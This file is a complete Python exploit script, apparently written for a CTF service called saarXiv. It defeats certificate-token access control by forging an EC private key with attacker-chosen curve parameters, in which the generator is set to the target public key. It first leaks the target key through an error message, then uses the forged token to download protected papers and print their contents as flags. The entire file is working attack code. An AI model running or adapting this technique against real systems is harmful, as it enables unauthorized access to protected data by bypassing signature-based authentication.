# coding: utf-8

import sys
import base64
import tempfile
import subprocess
import textwrap
import re
import html
import logging

import requests

secp384r1_params = base64.b64decode('''MIIBVwIBATA8BgcqhkjOPQEBAjEA////////////////////////////////////
//////7/////AAAAAAAAAAD/////MHsEMP//////////////////////////////
///////////+/////wAAAAAAAAAA/////AQwszEvp+I+5+SYjgVr4/gtGRgdnG7+
gUESAxQIj1ATh1rGVjmNii7RnSqFyO3T7CrvAxUAozWSaqMZonodAIlqZ3OkgnrN
rHMEYQSqh8oivosFN46xxx7zIK10bh07Younm5hZ90HgglQqOFUC8l2/VSlsOlRe
OHJ2Crc2F95KliYsb12emL+Sktwp+PQdvSiaFHzp2jETtfC4wApgsc4dfoGdekMd
fJDqDl8CMQD////////////////////////////////HY02B9Dct31gaDbJIsKd6
7OwZaszFKXMCAQE='''.replace('\s',''))

invalid_cert = 'LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUNTekNDQWRLZ0F3SUJBZ0lVZWxqYUM1RWRoQ0wweGJza3grU0NjNkpROXN3d0NnWUlLb1pJemowRUF3SXcKWFRFTE1Ba0dBMVVFQmhNQ1FWVXhFekFSQmdOVkJBZ01DbE52YldVdFUzUmhkR1V4SVRBZkJnTlZCQW9NR0VsdQpkR1Z5Ym1WMElGZHBaR2RwZEhNZ1VIUjVJRXgwWkRFV01CUUdBMVVFQXd3TmMyRmhjbGhwZGw4d01EQXdNVEFlCkZ3MHlNREF4TWpjeE16RTJNREZhRncweU1UQXhNall4TXpFMk1ERmFNRjB4Q3pBSkJnTlZCQVlUQWtGVk1STXcKRVFZRFZRUUlEQXBUYjIxbExWTjBZWFJsTVNFd0h3WURWUVFLREJoSmJuUmxjbTVsZENCWGFXUm5hWFJ6SUZCMAplU0JNZEdReEZqQVVCZ05WQkFNTURYTmhZWEpZYVhaZk1EQXdNREV3ZGpBUUJnY3Foa2pPUFFJQkJnVXJnUVFBCklnTmlBQVN4MEhTRW9Zd1VjUDdDUUJFV29rcFZQMlVhSW9aZ2FxdUdjVmJrOWhCUWZuZllzbk9BUUNYMEw5UHkKWTFzT2o0REllQm5odlJaN25ieHVXYjBvYjBBbkhQUnRBcHoySk5xT3h2M01FV1JMYURHZkJ6ajJEU3p1aFdvQgpGSnZSOTZXalV6QlJNQjBHQTFVZERnUVdCQlNMd0RlVkZpV1ZQQUJQdkZRdDZIRnJoY1NtenpBZkJnTlZIU01FCkdEQVdnQlNMd0RlVkZpV1ZQQUJQdkZRdDZIRnJoY1NtenpBUEJnTlZIUk1CQWY4RUJUQURBUUgvTUFvR0NDcUcKU000OUJBTUNBMmNBTUdRQ01EejNvYTFUYTc2eStIVHZycTF4TFpockdrODYvaWNodzROeWc0eExDR3QxUVI0QQozTi9JOUJDdk1RNXQweWRTOEFJd1JqVHA3Y2dQRXRVMGVJMzdkYlhjL3BQbjhXVmlMSlhFdXhIdndwUG9qWUpYCjlWdFdjc2RucHNkdVUyazRtSTNsCi0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K'

def custom_params(gen):
    return (secp384r1_params[:196] +
            gen +
            secp384r1_params[196+97:])
    
def hack_key(target_key):
    return (b'\x30\x82\x01\xfa\x02\x01\x01\x04\x30' + 
            (1).to_bytes(length=48, byteorder='big') + 
            b'\xa0\x82\x01\x5b' + 
            custom_params(target_key) + 
            b'\xa1\x64\x03\x62\x00' + 
            target_key)

def forge_token(paper_id, public_key):
    key = hack_key(public_key)
    with tempfile.NamedTemporaryFile('w') as temp:
        temp.write('-----BEGIN EC PRIVATE KEY-----\n')
        temp.write(textwrap.fill(base64.b64encode(key).decode(), 64)+'\n')
        temp.write('-----END EC PRIVATE KEY-----\n')
        temp.flush()

        token = subprocess.run(['openssl', 'req', '-new', '-x509', '-nodes', '-key', temp.name, '-days', '365', '-subj', '/CN=saarXiv_{:05}'.format(paper_id)], stdout=subprocess.PIPE).stdout

    return base64.b64encode(token)

def leak_flag(s, url, paper_id):
    r1 = s.get(url+'/Paper/Download', params={'id': paper_id})
    if not r1.headers['Content-Type'].startswith('text/html'):
        raise ValueError(f'No access restriction: {r1.headers}')
    req_token = re.findall(r'__RequestVerificationToken.*?value="(.*?)" />', r1.text, re.S)[0]
    r2 = s.post(url+'/Paper/Download', params={'id': paper_id}, data={'DownloadToken': invalid_cert, '__RequestVerificationToken': req_token})

    target_key = base64.b64decode(html.unescape(re.findall(r'Error: Token not valid for key (.*?)</div>', r2.text, re.S)[0]))

    req_token = re.findall(r'__RequestVerificationToken.*?value="(.*?)" />', r2.text, re.S)[0]
    forged_token = forge_token(paper_id, target_key)
    r3 = s.post(url+'/Paper/Download', params={'id': paper_id}, data={'DownloadToken': forged_token, '__RequestVerificationToken': req_token})

    if not r3.headers['Content-Type'].startswith('application/octet-stream'):
        return None

    with tempfile.NamedTemporaryFile() as f:
        f.file.write(r3.content)
        f.file.flush()
        return subprocess.run(['pdftotext', f.name, '-'], stdout=subprocess.PIPE).stdout.decode()


def exploit(target, local=False):
    url = 'http://{}:5000'.format(target)

    s = requests.Session()

    logging.debug('Getting list of flag_ids...')
    # get newest paper_id
    r = s.get(url+'/All')
    paper_ids = re.findall(r'saarXiv_([0-9]+)', r.text, re.S)
    logging.debug('Found %d ids: %s', len(paper_ids), paper_ids)

    # leak top 10
    for paper_id in paper_ids[:10]:
        logging.debug('Trying to leak %s', paper_id)
        try:
            print(leak_flag(s, url, int(paper_id)))
        except Exception as e:
            logging.exception('Exception while leaking paper %s', paper_id)



if __name__ == '__main__':
   
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) > 1:
        exploit(sys.argv[1])
    else:
        exploit('localhost')

